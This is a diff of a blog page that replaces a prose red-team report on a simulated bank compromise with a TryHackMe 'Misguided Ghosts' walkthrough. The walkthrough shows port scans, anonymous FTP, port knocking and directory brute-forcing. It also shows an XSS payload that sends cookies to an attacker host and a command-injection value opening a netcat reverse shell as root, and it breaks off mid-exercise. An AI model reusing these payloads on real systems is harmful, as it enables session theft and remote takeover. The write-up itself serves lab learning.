@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FinTech Red Team Engagement | Technical Intelligence Labs</title>
+    <title>Misguided Ghosts | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,53 +106,144 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">ethical-hacking</span>
-                <span>// 2025-12-30</span>
-                <span>// ID: REF-FinTech Red Team Engagement</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Misguided Ghosts</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">FinTech Red Team Engagement</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Misguided Ghosts</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- ['red teaming', 'fintech security', 'APT simulation', 'spear-phishing', 'lateral movement', 'domain compromise', 'cobalt strike', 'ethical hacking'] -->
+                <!-- tryhackme -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<h1>FinTech Red Team Engagement Report</h1>
-<h2>Introduction</h2>
-<p>This report details a full-scope Red Team operation conducted against a prominent digital bank. The engagement was designed to simulate the tactics, techniques, and procedures (TTPs) of an Advanced Persistent Threat (APT) group, with the primary objective of assessing the organization's resilience against sophisticated cyberattacks. The operation aimed to achieve domain compromise, evaluating the security controls, detection capabilities, and incident response processes of the target environment. The project also served as a practical exploration of advanced ethical hacking methodologies.</p>
-<h2>Reconnaissance</h2>
-<p>Initial intelligence gathering focused on open-source information (OSINT) to identify key personnel, organizational structures, and potential technological footprints relevant to the target digital bank. This phase aimed to build a comprehensive profile of the target environment, identifying potential entry points and suitable candidates for social engineering attacks. Specific attention was paid to identifying email address formats and publicly available employee information to craft credible spear-phishing lures.</p>
-<h2>Enumeration</h2>
-<p>Following the reconnaissance phase, targeted enumeration was conducted to further refine potential attack vectors. This involved analyzing identified employee profiles and external-facing infrastructure for any vulnerabilities or misconfigurations that could facilitate initial access. The data collected was critical for tailoring subsequent exploitation attempts, particularly for crafting highly personalized and convincing spear-phishing emails.</p>
-<h2>Exploitation</h2>
-<p>The primary method for gaining initial access was a meticulously planned spear-phishing campaign. Tailored emails, designed to bypass existing email security controls and exploit human factors, were sent to identified targets within the organization.</p>
-<h3>Initial Access &amp; Command and Control (C2) Establishment</h3>
-<p>Upon successful execution of a malicious payload by a target, initial access was gained on a user workstation. A sophisticated command and control (C2) channel was established utilizing <strong>Cobalt Strike</strong>. Cobalt Strike's beacon functionality provided a robust and covert communication pathway for subsequent post-exploitation activities, allowing for remote code execution, file transfers, and system information gathering without raising immediate suspicion.</p>
-<h2>Privilege Escalation &amp; Lateral Movement</h2>
-<p>With initial access established, the focus shifted to escalating privileges on the compromised host and then moving laterally within the network to reach high-value assets, specifically the domain controllers.</p>
-<h3>Local Privilege Escalation</h3>
-<p>Techniques were employed to escalate privileges on the initial foothold, moving from a standard user context to administrative or system-level access. This critical step enabled broader access to local resources and the ability to extract credentials or execute privileged operations necessary for lateral movement.</p>
-<h3>Lateral Movement</h3>
-<p>Leveraging the elevated privileges and collected credentials, various lateral movement techniques were executed to navigate deeper into the target's internal network. This involved:<br />
-*   <strong>Pass-the-Hash/Ticket</strong>: Reusing compromised NTLM hashes or Kerberos tickets to authenticate to other systems.<br />
-*   <strong>Service Creation/Modification</strong>: Installing or modifying services on remote machines to execute code.<br />
-*   <strong>Remote Code Execution (WMI/PsExec)</strong>: Utilizing administrative tools to execute commands remotely.</p>
-<p>Through a systematic approach, the Red Team mapped critical network segments and identified pathways leading to the domain controllers.</p>
-<h3>Domain Controller Compromise</h3>
-<p>The culmination of the lateral movement phase was the successful compromise of the organization's domain controllers. This provided full control over the Active Directory environment, signifying a complete breach of the target's core identity management system. The compromise demonstrated the potential for an APT to establish persistent access and exert extensive control over the entire enterprise network.</p>
-<h2>Conclusion</h2>
-<p>This Red Team engagement successfully demonstrated the ability of a simulated APT group to compromise the domain controllers of a digital bank. The operation highlighted critical vulnerabilities in the organization's security posture, specifically regarding its susceptibility to spear-phishing attacks and the effectiveness of its internal network segmentation and detection capabilities.</p>
-<p>Key achievements include:<br />
-*   Successful initial access via a sophisticated spear-phishing campaign.<br />
-*   Effective deployment and utilization of <strong>Cobalt Strike</strong> for C2 operations and post-exploitation.<br />
-*   Demonstrated expertise in complex <strong>Red Teaming</strong> methodologies, including privilege escalation and advanced lateral movement techniques.<br />
-*   Validation of an attack path leading to full domain compromise, mimicking real-world APT TTPs.</p>
-<p>The detailed findings of this engagement have been thoroughly documented in a comprehensive technical report, providing actionable recommendations for strengthening the digital bank's security defenses against advanced persistent threats.</p>
+<pre class="codehilite"><code>21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.153.193
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
+|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
+|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 3 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<pre class="codehilite"><code>└─$ ftp m.thm        
+Connected to m.thm.
+220 (vsFTPd 3.0.3)
+Name (m.thm:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||36730|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
+226 Directory send OK.
+ftp&gt; cd pub
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||21274|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
+-rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
+-rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng
+226 Directory send OK.
+ftp&gt; 
+
+
+└─$ cat info.txt          
+I have included all the network info you requested, along with some of my favourite jokes.
+
+- Paramore
+
+┌──(kali㉿kali)-[~/tryhackme/misguidedghosts]
+└─$ cat jokes.txt                       
+Taylor: Knock, knock.
+Josh:   Who's there?
+Taylor: The interrupting cow.
+Josh:   The interrupting cow--
+Taylor: Moo
+
+Josh:   Knock, knock.
+Taylor: Who's there?
+Josh:   Adore.
+Taylor: Adore who?
+Josh:   Adore is between you and I so please open up!
+</code></pre>
+
+<p><img alt="image" src="../images/posts/../images/posts/tryhackme1.png" /></p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/tryhackme/misguidedghosts]
+└─$ knock 10.64.162.195 7864 8273 9241 12007 60753
+
+└─$ nmap -p 8080 -sC -sV 10.64.162.195
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-03 21:42 EST
+Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 0.00% done
+Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 0.00% done
+Nmap scan report for m.thm (10.64.162.195)
+Host is up (0.35s latency).
+
+PORT     STATE SERVICE  VERSION
+8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
+|_http-title: Misguided Ghosts
+| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN
+| Not valid before: 2020-08-11T16:52:11
+|_Not valid after:  2021-08-11T16:52:11
+</code></pre>
+
+<pre class="codehilite"><code>└─$ gobuster dir -k -u https://10.64.162.195:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 2&gt;/dev/null
+
+/login                (Status: 200) [Size: 761]
+</code></pre>
+
+<p>After expore new website luck guess i login <code>zac:zac</code> and use this payload for cookie hajiack </p>
+<pre class="codehilite"><code>`&amp;#x3C;scrscriptipt&amp;#x3E; document.location='http://attacker ip:9001/XSS/grabber.php?c='+document.cookie &amp;#x3C;/scrscriptipt&amp;#x3E;`
+</code></pre>
+
+<p>open simple python server same port and get cokkie and using that login in browser wia editing cookie</p>
+<pre class="codehilite"><code>gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.79.34:8080 -c &quot;login=hayley_is_admin&quot; -k 2&gt;/dev/null
+</code></pre>
+
+<pre class="codehilite"><code>/photos?image=
+
+image=.;nc${IFS}10.8.106.222${IFS}9001${IFS}-e${IFS}/bin/sh
+</code></pre>
+
+<pre class="codehilite"><code>nc -lnvp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.10.79.34 43255
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+</code></pre>
+
+<p>now invistigate deep find secreats in thse any folder and get ssh credintials and have to brute force</p>
         </div>
     </main>
 
